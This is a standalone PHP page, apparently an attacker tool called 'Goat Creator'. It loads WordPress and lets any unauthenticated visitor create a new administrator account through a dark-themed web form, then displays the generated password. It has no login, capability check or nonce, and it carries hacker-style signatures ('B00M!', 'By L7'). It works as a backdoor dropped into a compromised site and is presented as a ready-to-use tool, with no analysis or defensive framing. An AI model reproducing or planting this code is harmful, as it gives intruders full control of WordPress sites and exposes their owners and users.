<?php

require_once('wp-load.php');

function generate_clean_password($length = 12) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $password = '';
    $max = strlen($chars) - 1;
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, $max)];
    }
    return $password;
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_admin'])) {
    $newusername = sanitize_user($_POST['username']);
    $newemail    = sanitize_email($_POST['email']);
    
    $newpassword = generate_clean_password(12);

    if (empty($newusername) || empty($newemail)) {
        $message = '<div class="alert alert-error">Username and email are required!</div>';
    } else {
        if (!username_exists($newusername) && !email_exists($newemail)) {
            $user_id = wp_create_user($newusername, $newpassword, $newemail);

            if (!is_wp_error($user_id)) {
                $wp_user_object = new WP_User($user_id);
                $wp_user_object->set_role('administrator');
                
                $message = '<div class="alert alert-success">' .
                           '<span class="alert-title">Success! Selamat Bekerja ^-^</span>' .
                           '<div class="credential-item"><span>Username:</span> <strong>' . esc_html($newusername) . '</strong></div>' .
                           '<div class="credential-item"><span>Password:</span> <code>' . esc_html($newpassword) . '</code></div>' .
                           '<div class="credential-item"><span>Email:</span> <strong>' . esc_html($newemail) . '</strong></div>' .
                           '<div class="warning-text">By L7</div>' .
                           '</div>';
            } else {
                $message = '<div class="alert alert-error">Failed to create user: ' . esc_html($user_id->get_error_message()) . '</div>';
            }
        } else {
            $message = '<div class="alert alert-warning">Username or email already exists on this WordPress site!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Goat Creator - Dark Red Edition</title>
    <style>
        :root {
            --bg-color: #0d0d11;
            --card-bg: #16161e;
            --input-bg: #0f0f14;
            --accent-red: #ff2a4b;
            --accent-red-hover: #e01f3d;
            --accent-glow: rgba(255, 42, 75, 0.35);
            --text-main: #f1f1f5;
            --text-muted: #8a8a9e;
            --border-color: #2a2a38;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 440px;
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 32px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(255, 42, 75, 0.05);
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #ff2a4b, #ff7b00);
        }

        h2 {
            font-size: 24px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 24px;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        h2::before {
            content: '';
            display: inline-block;
            width: 8px;
            height: 20px;
            background: var(--accent-red);
            border-radius: 2px;
            box-shadow: 0 0 10px var(--accent-red);
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        input[type="text"], input[type="email"] {
            width: 100%;
            padding: 12px 16px;
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-main);
            font-size: 14px;
            outline: none;
            transition: all 0.25s ease;
        }

        input[type="text"]:focus, input[type="email"]:focus {
            border-color: var(--accent-red);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff2a4b, #c71535);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s ease;
            box-shadow: 0 4px 15px var(--accent-glow);
            margin-top: 10px;
        }

        button:hover {
            background: linear-gradient(135deg, #ff405e, #d81b3c);
            box-shadow: 0 6px 20px rgba(255, 42, 75, 0.5);
            transform: translateY(-1px);
        }

        button:active {
            transform: translateY(0);
        }

        .alert {
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 24px;
            font-size: 13.5px;
            line-height: 1.5;
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: #34d399;
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #f87171;
        }

        .alert-warning {
            background: rgba(245, 158, 11, 0.1);
            border: 1px solid rgba(245, 158, 11, 0.3);
            color: #fbbf24;
        }

        .alert-title {
            display: block;
            font-weight: 700;
            margin-bottom: 12px;
            font-size: 14px;
        }

        .credential-item {
            margin-bottom: 6px;
            color: #e2e8f0;
        }

        .credential-item span {
            color: var(--text-muted);
        }

        code {
            background: #09090d;
            border: 1px solid var(--border-color);
            padding: 3px 8px;
            border-radius: 4px;
            color: #ff2a4b;
            font-family: 'Courier New', Courier, monospace;
            font-size: 15px;
            font-weight: bold;
        }

        .warning-text {
            margin-top: 12px;
            padding-top: 10px;
            border-top: 1px dashed rgba(239, 68, 68, 0.3);
            color: #f87171;
            font-size: 12px;
            font-weight: 600;
        }

        .note {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 20px;
            text-align: center;
            border-top: 1px solid var(--border-color);
            padding-top: 16px;
        }

        .github-link {
            color: var(--accent-red);
            text-decoration: none;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            transition: all 0.2s ease;
        }

        .github-link svg {
            width: 15px;
            height: 15px;
            fill: currentColor;
            transition: transform 0.2s ease;
        }

        .github-link:hover {
            color: #ff526d;
            text-shadow: 0 0 8px var(--accent-glow);
        }

        .github-link:hover svg {
            transform: scale(1.15);
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Goat Creator</h2>
    
    <?php if (!empty($message)) echo $message; ?>

    <form method="POST" action="">
        <div class="form-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="username" required value="<?php echo isset($_POST['username']) ? esc_attr($_POST['username']) : ''; ?>">
        </div>
        
        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="email" required value="<?php echo isset($_POST['email']) ? esc_attr($_POST['email']) : ''; ?>">
        </div>

        <button type="submit" name="create_admin">B00M!</button>
    </form>

    <p class="note">Developed by 
        <a href="https://github.com/luckisandani7" target="_blank" rel="noopener noreferrer" class="github-link">
            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
            L7
        </a>
    </p>
</div>

</body>
</html>
